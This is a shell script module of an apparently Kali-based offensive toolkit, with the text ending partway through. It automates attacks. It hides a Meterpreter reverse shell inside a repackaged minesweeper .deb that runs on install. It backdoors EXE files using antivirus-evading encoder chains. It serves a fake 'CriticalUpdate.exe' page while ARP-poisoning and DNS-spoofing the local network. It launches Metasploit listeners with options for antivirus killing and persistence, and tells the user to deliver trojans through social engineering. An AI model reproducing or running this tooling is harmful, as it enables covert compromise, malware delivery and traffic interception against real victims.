#!/bin/sh
### inicio
#
# THIS SCRIPT WAS MADE TO WORK ON A UNIX SYSTEM
# Develop By: pedr0 Ubuntu [r00t-3xp10it]
# peterubuntu10[at]sourceforge[dot]net
#
# REPORT ANY BUGS FOUND TO MY WIKI PAGE
# http://sourceforge.net/projects/netoolsh/
# Codename: 'the lulz boat'
# v3rsi0n:3.1
# KALI-DISTRO
#
###








# ----------------------------------
# CONFIGURATIONS OF THE SCRIPT
# ----------------------------------
####################################################################################################
#                            path to frameworks installed                                          #
#  if you want to change the paths to frameworks look at /opensource/toolkit_config                #
####################################################################################################
ver="3.1"                                                  # module version develop                #
priv8="priv8"                                              # instalation path to folder priv8      #
H0m3=`echo ~`                                              # grab home directory                   #
OS=`uname`                                                 # grab OS - Linux or other              #
user=`who | cut -d' ' -f1 | sort | uniq`                   # grab username                         #
DiStR0=`awk '{print $1}' /etc/issue`                       # grab distribution - Ubuntu or Kali    #
GATE=`ip route | grep "static" | awk {'print $3'}`         # gab gateway                           #
V3iL=`cat $H0m3/opensource/toolkit_config | egrep -m 1 "VEIL_EVASION_CONF" | cut -d '=' -f2`       #
mig=`cat $H0m3/opensource/toolkit_config | egrep -m 1 "MIGRATE_TO" | cut -d '=' -f2`               #
tWd=`cat $H0m3/opensource/toolkit_config | egrep -m 1 "TEMP_FOLDER" | cut -d '=' -f2`              #
apache=`cat $H0m3/opensource/toolkit_config | egrep -m 1 "APACHE_INSTALL_PATH" | cut -d '=' -f2`   #
confD=`cat $H0m3/opensource/toolkit_config | egrep -m 1 "ETTERDNS_INSTALL_PATH" | cut -d '=' -f2`  #
find=`cat $H0m3/opensource/toolkit_config | egrep -m 1 "METASPLOIT_INSTALL_PATH" | cut -d '=' -f2` #
####################################################################################################




# -----------------------------------
# Colorise shell Script output leters
# -----------------------------------
Colors() {
Escape="\033";
  white="${Escape}[0m";
  RedF="${Escape}[31m";
  GreenF="${Escape}[32m";
  YellowF="${Escape}[33m";
  BlueF="${Escape}[34m";
  CyanF="${Escape}[36m";
Reset="${Escape}[0m";
}



# -----------------------------------
# check if dependencies are installed
# -----------------------------------
Colors;

   #check if metasploit exists
   if [ -d $find ]; then
   echo ${BlueF}[*]${RedF}:${BlueF}[Metasploit]:${white}installation found...${Reset};
   sleep 1

else

   Colors;
   echo ${RedF}[x]:[warning]:this module required Metasploit instaled to work...${Reset};
   echo ${YellowF}[+]${RedF}:${YellowF}more 'info' here: http://www.darkoperator.com/installing-metasploit-in-ubunt/ ${Reset};
   sleep 4
   exit
fi


   #check if apache exists
   if [ -d $apache ]; then
   echo ${BlueF}[*]${RedF}:${BlueF}[Apache]:${white}installation found...${Reset};
   sleep 1

else

   Colors;
   echo ${RedF}[x]:[warning]:this module required Apache webserver instaled to work...${Reset};
   echo ${YellowF}[+]${RedF}:${YellowF}more 'info' here: http://www.maketecheasier.com/install-and-configure-apache-in-ubuntu/2011/03/09 ${Reset};
   sleep 4
   exit
fi


   #check if zenity exists
   if [ -d /usr/share/zenity ]; then
   echo ${BlueF}[*]${RedF}:${BlueF}[zenity]:${white}installation found...${Reset};
   sleep 1

else

   Colors;
   echo ${RedF}[x]:[warning]:this module required zenity instaled to work...${Reset};
   echo ${YellowF}[+]${RedF}:${YellowF}more 'info' here: http://www.tecmint.com/zenity-creates-graphical-gtk-dialog-boxes-in-command-line-and-shell-scripts/ ${Reset};
   apt-get install zenity
   sleep 4
   exit
fi



# ----------------------------------
# output current running ip address
# ----------------------------------
# grab network interface
InT3R=`netstat -r | grep "default" | awk {'print $8'}`
QuE=$(zenity --question --title "INTERFACE IN USE?" --text "-:[ $InT3R ? ]:-" --width 300) > /dev/null 2>&1
     if [ "$?" -eq "0" ]; then
       inter="$InT3R"

else

  # interface grab aborted by user
  zenity --info --title="INTERFACE -> ABORTED" --text "Please check your network connection\nor manually input your interface in use" --width 350 > /dev/null 2>&1
  echo ${GreenF}[*]${RedF}:${GreenF}[Available Network Interfaces]: ${Reset};
  echo ""
  cat /proc/net/dev | tr -s  ' ' | cut -d ' ' -f1,2 | sed -e '1,2d'
  echo ""
  inter=$(zenity --title="Input interface in use" --text "example: wlan0 OR eth0" --entry --width 300) > /dev/null 2>&1

fi




# ----------------------------
# grab Operative System distro to store IP addr
# output = Ubuntu OR Kali OR Parrot OR BackBox
# ----------------------------
      case $DiStR0 in
      Kali) IP=`ifconfig $inter | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
      Debian) IP=`ifconfig $inter | egrep -w "inet" | awk '{print $2}'`;;
      Ubuntu) IP=`ifconfig $inter | egrep -w "inet" | awk '{print $3}'`;;
      Parrot) IP=`ifconfig $inter | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
      BackBox) IP=`ifconfig $inter | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
      *) IP=`zenity --title="Input your IP addr" --text "example: 192.168.1.68" --entry --width 300`;;
esac
clear



# ----------------------------------
# display public ip address or not
# depending of toolkit_config file
# ----------------------------------
    pia=`cat $H0m3/opensource/toolkit_config | egrep -m 1 "DISPLAY_PUBLIC_IP" | cut -d '=' -f2`
    if [ "$pia" = "NO" ]; then
    extIP="Stealth_Mode"

else

    extIP=`wget -q -O - checkip.dyndns.org | sed -e 's/[^[:digit:]|.]//g'`

fi




# ----------------------------------
# bash trap ctrl-c and call ctrl_c()
# ----------------------------------
trap ctrl_c INT
ctrl_c() {
sh_exit
}



# ----------------------------------
# END OF CONFIGURATIONS
# ----------------------------------















# ----------------------------------
# START OF SCRIPT FUNCTIONS
# ----------------------------------
# package.deb linux trojan backdoor (inject a payload into a game.deb)
sh_package () {
Colors;

         # clean up script
         if [ -d $tWd ]; then
         rm -r $tWd
         echo ${RedF}[x] [WAIT]:[ Deleting old payload from cache ]${Reset};
         sleep 1
         sh_package

else

   # get user input to build the payload (zenity)
   echo ${BlueF}[*]${RedF}:${YellowF}[input payload settings]${Reset};
   lhost=$(zenity --title="Input LHOST" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
   lport=$(zenity --title="Input LPORT" --text "example: 4444" --entry --width 300) > /dev/null 2>&1


   # downloading package freesweep.deb
   echo ${BlueF}[*]${RedF}:${BlueF}[Download]${RedF}:${GreenF}[ freesweep.deb ] ${Reset};
   wget -qq -O $H0m3/opensource/priv8/freesweep_0.90-2_i386.deb https://dl.dropboxusercontent.com/u/21426454/netool-kali/freesweep_0.90-2_i386.deb | zenity --progress --pulsate --title "DOWNLOADING" --text="FILE: freesweep.deb" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
   # building deb working dir
   mkdir $tWd
   mv $H0m3/opensource/priv8/freesweep_0.90-2_i386.deb $tWd
   cd $tWd/
   dpkg -x freesweep_0.90-2_i386.deb work
   mkdir work/DEBIAN
   cd work/DEBIAN

      # making control file
      echo ${BlueF}[*]${RedF}:${BlueF}[building]${RedF}:${GreenF}[ control and postinst ]${Reset};
      sleep 1
      echo 'Package: freesweep' > control
      echo 'Version: 0.90-2' >> control
      echo 'Section: Games and Amusement' >> control
      echo 'Priority: optional' >> control
      echo 'Architecture: i386' >> control
      echo 'Maintainer: Ubuntu MOTU Developers [ubuntu-motu@lists.ubuntu.com]' >> control
      echo 'Description: a text-based minesweeper game' >> control

      # making postinst file
      echo '#!/bin/sh' > postinst
      echo 'sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores & /usr/games/freesweep &' >> postinst
      chmod 755 postinst
      chmod +x control


   # building payload
   echo ${BlueF}[*]${RedF}:${BlueF}[compiling]${RedF}:${GreenF}[ freesweep.deb ]${Reset};
   xterm -T "r00tsect0r - building freesweep.deb" -geometry 110x23 -e "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -a x86 --platform Linux -e x86/shikata_ga_nai -i 9 -b '/x00/x0a' -f exe > $tWd/work/usr/games/freesweep_scores"


      sleep 2
      # building package.deb with all files
      dpkg-deb --build $tWd/work > /dev/null 2>&1
      sleep 7
      mv $tWd/work.deb $H0m3/opensource/priv8/freesweep.deb

cat << !

     Payload [debian] Final Config:
     ==============================
     LHOST            : $lhost
     LPORT            : $lport
     FILENAME         : freesweep.deb
     PAYLOAD          : linux/x86/meterpreter/reverse_tcp
     STORAGE IN       : $H0m3/opensource/priv8/freesweep.deb
     AFFECTED SYSTEMS : Linux OS (debian)

!
      echo ${BlueF}[*]${RedF}:${white}send ${GreenF}[freesweep.deb]${white} to a target machine using social engineering${Reset};
      # set permissions to file
      cd $H0m3/opensource/priv8
      chmod 755 freesweep.deb
      sh_gstt

fi
}






sh_gstt () {
Colors;

# CHOSE WHAT POST-EXPLOITATION MODULE TO USE
echo ${BlueF}[*]${RedF}:${BlueF}[metasploit listenner]${RedF}:${GreenF}[ RUNNING ] ${Reset};
pass=$(zenity --list --title "POST EXPLOITATION" --text "If you chose to run Post-auto.rc handler then\nInput one-per-line the post modules to use into:\n$H0m3/opensource/modules/Post-auto.rc\n" --radiolist --column "Pick" --column "Option" TRUE "Default listenner" FALSE "Post-auto.rc" --width 350 --height 240) > /dev/null 2>&1


   if [ "$pass" = "Default listenner" ]; then
     # starting a metasploit listenner
     echo ${RedF}[x]:[warning]: [ctrl+c] or [exit] to exit meterpreter shell ${Reset};
     sleep 2
     xterm -T "r00tsect0r - Automated exploit: package.deb trojan payload" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD linux/x86/meterpreter/reverse_tcp; exploit'"  & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$target//
     sh_dsye # jump to shell_listenner.rc


       elif [ "$pass" = "Post-auto.rc" ]; then
       # starting a metasploit listenner (post-auto.rc)
       echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to exit meterpreter shell ${Reset};
       sleep 2
       xterm -T "r00tsect0r - Automated exploit: package.deb trojan payload" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $H0m3/opensource/modules/Post-auto.rc; exploit'"  & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$target//
       sh_dsye # jump to shell_listenner.rc


   else

     echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
     cd $H0m3/opensource
     sleep 2
     clear
fi
}




sh_dsye () {
Colors;

  # 'shell_listenner.rc' file with msf settings will be stored under
  # '/opensource/priv8/' if we wish to start a listenner later...
  echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ BUILDING RC FILE ] ${Reset};
  sleep 1
  cd $H0m3/opensource/priv8
  mkdir handler > /dev/null 2>&1
  cd handler > /dev/null 2>&1
  echo "use exploit/multi/handler" > linuxDeb-handler.rc
  echo "set PAYLOAD linux/x86/meterpreter/reverse_tcp" >> linuxDeb-handler.rc
  echo "set LPORT $lport" >> linuxDeb-handler.rc
  echo "set LHOST $lhost" >> linuxDeb-handler.rc
  echo "set ExitOnSession false" >> linuxDeb-handler.rc
  echo "exploit -j -z" >> linuxDeb-handler.rc
  zenity --info --title "BUILDING RC CONF FILE" --text "How to run your listenner later:\nmsfconsole -r linuxDeb-handler.rc\n\nStorage:\n$H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1
cd $H0m3/opensource
clear
}













# ------------------------------------------
# Backdooring EXE Files + Veil-Evasion (BDF)
# ------------------------------------------
sh_backdoorfile () {
Colors;

# local variables declaration
LHOST=`ifconfig $inter | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`
# GRAB VEIL-EVASION INSTALL PATH
V31L=`cat $V3iL | egrep -m 1 "VEIL_EVASION_PATH" | cut -d '=' -f2 | cut -d '"' -f2` > /dev/null 2>&1
# GRAB VEIL-EVASION COMPILED OUTPUT FOLDER
VEC0F=`cat $V3iL | egrep -m 1 "PAYLOAD_COMPILED_PATH" | cut -d '=' -f2 | cut -d '"' -f2` > /dev/null 2>&1
# GRAB VEIL-EVASION HANDLERS OUTPUT FOLDER
VEH0F=`cat $V3iL | egrep -m 1 "HANDLER_PATH" | cut -d '=' -f2 | cut -d '"' -f2` > /dev/null 2>&1



m0D=$(zenity --list --title "BACKDOOR EXE FILES" --text "\nWARNING:  backdoor_factory (bdf)\nRequired 'Veil-Evasion.py' installed...\n\nChose how to build the Trojan Horse" --radiolist --column "Pick" --column "Option" TRUE "toolkit (msf) module" FALSE "backdoor_factory (bdf)" --width 320 --height 265) > /dev/null 2>&1

      if [ "$m0D" = "toolkit (msf) module" ]; then
      sh_backdoorfile22

      elif [ "$m0D" = "backdoor_factory (bdf)" ]; then
      sh_bdf

else

  echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
  sleep 2
fi
}


sh_bdf () {
Colors;

   if [ -e $V3iL ]; then
   #if [ -d $V31L ]; then

     # input payoad settings
     echo ${BlueF}[*]${RedF}:${BlueF}[Please wait]${RedF}:${GreenF}[ BUILDING PAYLOAD ] ${Reset};
     LHOST=$(zenity --title="Input LHOST" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
     LPORT=$(zenity --title="ENTER PAYLOAD LPORT" --text "example: 666" --entry --width 330) > /dev/null 2>&1
     OUT=$(zenity --title="NAME YOUR PAYLOAD" --text "example: virus" --entry --width 300) > /dev/null 2>&1
     BAP=$(zenity --title "☠ Chose file to be backdoored ☠" --filename=$H0m3/opensource/templates/ --file-selection) > /dev/null 2>&1

       cd $V31L
       # build payload using Veil-Evasion
       xterm -T "BACKDOOR EXE FILES (BDF)" -geometry 110x23 -e "./Veil-Evasion.py -p native/backdoor_factory -c LHOST=$LHOST LPORT=$LPORT orig_exe=$BAP -o $OUT"

    # copy files to toolkit
    echo ${BlueF}[*]${RedF}:${BlueF}[Please wait]${RedF}:${GreenF}[ MOVING GENERATED FILES TO TOOKIT ] ${Reset};
    cd $VEC0F > /dev/null 2>&1
    mv $OUT.exe $H0m3/opensource/priv8/$OUT.exe
    cd $VEH0F > /dev/null 2>&1
    mv *.rc $H0m3/opensource/priv8/handler > /dev/null 2>&1
    sleep 1

  # change ownership of files generated
  zenity --info --title="GENERATED FILES (BDF)" --text "$H0m3/opensource/priv8/$OUT.exe\n$H0m3/opensource/priv8/handler/$OUT-handler.rc" --width 500 > /dev/null 2>&1
  cd $H0m3/opensource/priv8/handler
  rm -r backdoored > /dev/null 2>&1
  cd $H0m3/opensource


cat << !

     Payload [trojan] Final Config:
     ==============================
     LHOST            : $LHOST
     LPORT            : $LPORT
     FILENAME         : $OUT.exe
     STORAGE IN       : $H0m3/opensource/priv8/$OUT.exe
     MULTI HANDLER    : $H0m3/opensource/priv8/handler/$OUT-handler.rc
     PAYLOAD          : windows/meterpreter/reverse_tcp
     AFFECTED SYSTEMS : Windows OS

!


    # chose what to do with generated backdoor
    cH0=$(zenity --list --title "BACKDOOR EXE FILES" --text "Chose what to do with generated: $OUT.exe" --radiolist --column "Pick" --column "Option" TRUE "start multi-handler (listenner)" FALSE "use host-a-file-attack" --width 340 --height 190) > /dev/null 2>&1

      if [ "$cH0" = "use host-a-file-attack" ]; then
      cp $H0m3/opensource/priv8/$OUT.exe $H0m3/$OUT.exe
      sh_powershell

        elif [ "$cH0" = "start multi-handler (listenner)" ]; then
        sh_ftn

      else
      echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
      sleep 2
      fi

else

  # error funtion (veil not found)
  echo ${RedF}[x]:[ERROR]:[${YellowF} VEIL-EVASION NOT FOUND ${RedF}] ${Reset};
  zenity --info --title="BACKDOOR EXE FILES (BDF)" --text "ERROR: VEIL-FRAMEWORK NOT FOUND..." --width 400 > /dev/null 2>&1

fi
}





# --------------------------------------->
# a funçao começa aqui no priv8.sh
# mas eu ja a modifiquei quase toda
# --------------------------------------->





sh_backdoorfile22 () {
Colors;

   # get user input to build the payload
   echo ${BlueF}[*]${RedF}:${YellowF}[input payload settings]${Reset};
   LHOST=$(zenity --title="Input LHOST" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
   lport=$(zenity --title="enter LPORT" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
   paname=$(zenity --title="NAME YOUR PAYLOAD" --text "example: payload.exe" --entry --width 300) > /dev/null 2>&1
   pathexe=$(zenity --title "☠ Chose file to be backdoored ☠" --filename=$H0m3/opensource/templates/ --file-selection) > /dev/null 2>&1

     # building the trojan [keep template working]
     echo ${BlueF}[*]${RedF}:${BlueF}[building]${RedF}:${GreenF}[ $paname ]${Reset};
     xterm -T "r00tsect0r - building $paname" -geometry 110x23 -e "msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$lport -a x86 --platform windows -e x86/countdown -i 8 -f raw | msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 7 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -x $pathexe -k > $H0m3/opensource/priv8/$paname"

      # execute privs on trojan generated
      chown $user $H0m3/opensource/priv8/$paname
      chmod 755 $H0m3/opensource/priv8/$paname

cat << !

     Payload [trojan] Final Config:
     ==============================
     LHOST            : $LHOST
     LPORT            : $lport
     FILENAME         : $paname
     STORAGE IN       : $H0m3/opensource/priv8/$paname
     PAYLOAD          : windows/meterpreter/reverse_tcp
     AFFECTED SYSTEMS : Windows OS

!
    # chose what to do with generated backdoor
    cH0=$(zenity --list --title "BACKDOOR EXE FILES" --text "Chose what to do with generated: $paname" --radiolist --column "Pick" --column "Option" TRUE "start multi-handler (listenner)" FALSE "use host-a-file-attack" --width 340 --height 190) > /dev/null 2>&1

      if [ "$cH0" = "use host-a-file-attack" ]; then
      cp $H0m3/opensource/priv8/$paname $H0m3/$paname
      sh_powershell

        elif [ "$cH0" = "start multi-handler (listenner)" ]; then
        sh_ftn

      else
      echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
      sleep 2
      fi
}


sh_ftn () {
Colors;

# CHOSE WHAT POST-EXPLOITATION MODULE TO USE
echo ${BlueF}[*]${RedF}:${BlueF}[metasploit listenner]${RedF}:${GreenF}[ RUNNING ] ${Reset};
pass=$(zenity --list --title "POST EXPLOITATION" --text "\nDefault  :  dont migrate to system\nmigrate  :  migrate to -> $mig\nkillav  :  stop Anti-Virus process\nscraper  :  enumerate about everything\npersistence  :  start the backdoor in startup\nPost-auto.rc  :  run a list of post modules\n\nIf you chose to run Post-auto.rc handler then\nInput one-per-line the post modules to use into:\n$H0m3/opensource/modules/Post-auto.rc\n" --radiolist --column "Pick" --column "Option" TRUE "Default listenner" FALSE "migrate" FALSE "killav" FALSE "scraper" FALSE "persistence" FALSE "Post-auto.rc" --width 350 --height 520) > /dev/null 2>&1


      if [ "$pass" = "migrate" ]; then
      # starting a metasploit listenner
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to exit meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: '$paname' Listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $LHOST; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript migrate -n $mig; exploit'"
      sh_rsogg # jump to resource file (shell_listenner.rc)

      elif [ "$pass" = "Default listenner" ]; then
      # starting a metasploit listenner
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to exit meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: '$paname' Listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $LHOST; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
      sh_rsogg # jump to resource file (shell_listenner.rc)

      elif [ "$pass" = "killav" ]; then
      # starting a metasploit listenner
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to exit meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: '$paname' Listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $LHOST; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript killav; exploit'"
      sh_rsogg # jump to resource file (shell_listenner.rc)

      elif [ "$pass" = "scraper" ]; then
      # starting a metasploit listenner
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to exit meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: '$paname' Listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $LHOST; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript scraper; exploit'"
      sh_rsogg # jump to resource file (shell_listenner.rc)

      elif [ "$pass" = "persistence" ]; then
      # starting a metasploit listenner
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to exit meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: '$paname' Listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $LHOST; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript persistence -U -i 5 -p 8080 -r $LHOST; exploit'"

        # 'shell_listenner.rc' file with msf settings will be stored under
        # '/opensource/priv8/' if we wish to start a listenner later...
        echo ${BlueF}[*]${RedF}:${BlueF}[please wait]:${GreenF}[ BUILDING RC FILE ] ${Reset};
        sleep 1
        cd $H0m3/opensource/priv8
        mkdir handler > /dev/null 2>&1
        cd handler > /dev/null 2>&1
        echo "use exploit/multi/handler" > backdooring-persistence.rc
        echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> backdooring-persistence.rc
        echo "set LPORT 8080" >> backdooring-persistence.rc
        echo "set LHOST $LHOST" >> backdooring-persistence.rc
        echo "set ExitOnSession false" >> backdooring-persistence.rc
        echo "exploit -j -z" >> backdooring-persistence.rc
        zenity --info --title "BUILDING RC CONF FILE" --text "How to run your listenner later:\nmsfconsole -r backdooring-persistence.rc\n\nStorage:\n$H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1
      chown $user backdooring-persistence.rc > /dev/null 2>&1
      chown -R $user $H0m3/opensource/priv8/handler
      cd $H0m3/opensource
      clear


      elif [ "$pass" = "Post-auto.rc" ]; then
      # starting a metasploit listenner (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner. ] ${Reset};
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ loading resource ] ${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: '$paname' Listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $LHOST; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $H0m3/opensource/modules/Post-auto.rc; exploit'"
      sh_rsogg # jump to resource file (shell_listenner.rc)

   else

     echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
     sleep 2
fi
}





# resource file
sh_rsogg () {
Colors;

   # 'shell_listenner.rc' file with msf settings will be stored under
   # '/opensource/priv8/' if we wish to start a listenner later...
   echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ BUILDING RC FILE ] ${Reset};
   sleep 1
   mkdir $H0m3/opensource/priv8/handler > /dev/null 2>&1
   cd $H0m3/opensource/priv8/handler > /dev/null 2>&1

     # filter payload name to rename handler file
     echo "$paname" > rep.log
     fill=`cat rep.log | cut -d '.' -f1`
     echo "$fill" > rep.log
     resource=`cat rep.log`
     rm rep.log > /dev/null 2>&1

   echo "use exploit/multi/handler" > $resource-handler.rc
   echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> $resource-handler.rc
   echo "set LPORT $lport" >> $resource-handler.rc
   echo "set LHOST $LHOST" >> $resource-handler.rc
   echo "set ExitOnSession false" >> $resource-handler.rc
   echo "exploit -j -z" >> $resource-handler.rc
   zenity --info --title "BUILDING RC CONF FILE" --text "How to run your listenner later:\nmsfconsole -r $resource-handler.rc\n\nStorage:\n $H0m3/opensource/priv8/handler" --width 450 > /dev/null 2>&1
   chown $user $resource-handler.rc > /dev/null 2>&1
   chown -R $user $H0m3/opensource/priv8/handler
cd $H0m3/opensource
clear
}










# ----------------------------------
# fakeupdate DNS-spoofing MITM attack
# ----------------------------------
sh_fake () {
Colors;

         # clean up script
         if [ -d $tWd ]; then
         rm -r $tWd
         echo ${RedF}[x]:[WAIT]:[ Deleting old payload from cache ]${Reset};
         sleep 1
         sh_fake

else

      # get user input to build the payload
      echo ${BlueF}[*]${RedF}:${YellowF}[input payload settings]${Reset};
      lhost=$(zenity --title="Input LHOST" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
      lport=$(zenity --title="Input LPORT" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
      echo -n "[+]:{leave blank to poison all local network}(enter router ip address):"
      read router
      echo -n "[+]:{leave blank to poison all local network}(enter target ip address):"
      read target

   # downloading file from network
   mkdir $tWd
   cd $tWd
   echo ${BlueF}[*]${RedF}:${BlueF}[Download]${RedF}:${GreenF}[ FakeUpdate.tar.gz ]${Reset};
   wget -qq https://dl.dropboxusercontent.com/u/21426454/netool-kali/FakeUpdate.tar.gz | zenity --progress --pulsate --title "DOWNLOADING" --text="FILE: FakeUpdate.tar.gz" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
   tar -xf FakeUpdate.tar.gz
   cd FakeUpdate

       # building encrypted payload
       echo ${BlueF}[*]${RedF}:${BlueF}[building]${RedF}:${GreenF}[ CriticalUpdate.exe ]${Reset};
     xterm -T "r00tsect0r - building CriticalUpdate.exe" -geometry 110x23 -e "msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -a x86 --platform windows -e x86/countdown -i 8 -f raw | msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 7 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe > $H0m3/opensource/priv8/CriticalUpdate.exe"


cat << !

     Payload [exe] Final Config:
     ===========================
     LHOST            : $lhost
     LPORT            : $lport
     FILENAME         : CriticalUpdate.exe
     STORAGE IN       : $apache/CriticalUpdate.exe
     PAYLOAD          : windows/meterpreter/reverse_tcp
     AFFECTED SYSTEMS : Windows OS

!
      sleep 2
      # copy files to apache webroot
      cp CriticalUpdate.exe $apache/CriticalUpdate.exe
      cp -r Fake_Update.aspx_files $apache/Fake_Update.aspx_files
      cp index.html $apache/index.html
      cd $apache/
      chmod +x CriticalUpdate.exe
      xterm -T "r00tsect0r - start Apache webserver" -geometry 110x23 -e "/etc/init.d/apache2 start"
      echo ${BlueF}[*]${RedF}:${BlueF}[start apache2]${RedF}:${GreenF}[ OK ]${Reset};

         # starting arp poison
         echo ${BlueF}[*]${RedF}:${BlueF}[edit etter.dns]${RedF}:${YellowF}[ PRESS ENTER ]${Reset};
         read op
         xterm -T "r00tsect0r - DNS_SPOOF - press [ctrl+x] to quit" -geometry 110x23 -e "nano $confD"
         sh_clj
fi
}


sh_clj () {
Colors;

# CHOSE WHAT POST-EXPLOITATION MODULE TO USE
echo ${BlueF}[*]${RedF}:${BlueF}[metasploit listenner]${RedF}:${GreenF}[ RUNNING ] ${Reset};
pass=$(zenity --list --title "POST EXPLOITATION" --text "\nDefault  :  dont migrate to system\nmigrate  :  migrate to -> $mig\nkillav  :  stop Anti-Virus process\nscraper  :  enumerate about everything\npersistence  :  start the backdoor in startup\nPost-auto.rc  :  run a list of post modules\n\nIf you chose to run Post-auto.rc handler then\nInput one-per-line the post modules to use into:\n$H0m3/opensource/modules/Post-auto.rc\n" --radiolist --column "Pick" --column "Option" TRUE "Default listenner" FALSE "migrate" FALSE "killav" FALSE "scraper" FALSE "persistence" FALSE "Post-auto.rc" --width 350 --height 520) > /dev/null 2>&1


      if [ "$pass" = "migrate" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[running spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      echo ${RedF}[x]:[warning]: press [q] to stop MITM attack ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: fakeupdate.exe attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript migrate -n $mig; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$target//
      sh_clj2


      elif [ "$pass" = "killav" ]; then
      # starting a metasploit listenner and migrate (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[running spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      echo ${RedF}[x]:[warning]: press [q] to stop MITM attack ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: fakeupdate.exe attack" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript killav; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$target//
      sh_clj2

      elif [ "$pass" = "scraper" ]; then
      # starting a metasploit listenner and migrate (windows x86)
